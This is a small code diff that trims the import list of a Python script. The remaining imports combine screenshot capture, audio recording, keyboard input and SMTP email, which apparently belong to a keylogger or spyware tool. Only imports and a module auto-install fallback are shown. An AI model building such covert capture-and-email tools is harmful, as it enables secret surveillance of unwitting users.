@@ -2,13 +2,11 @@ try:
 
     import logging
     import os
-    import time
     import platform
     import smtplib
     import socket
     import threading
     import wave
-    import pyautogui
     import pyscreenshot
     import sounddevice as sd
     from dotenv  import load_dotenv
@@ -22,7 +20,6 @@ try:
     from email.mime.multipart import MIMEMultipart
     from scipy.io.wavfile import write
     from email.mime.text import MIMEText
-    import glob
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot","sounddevice","pynput"]
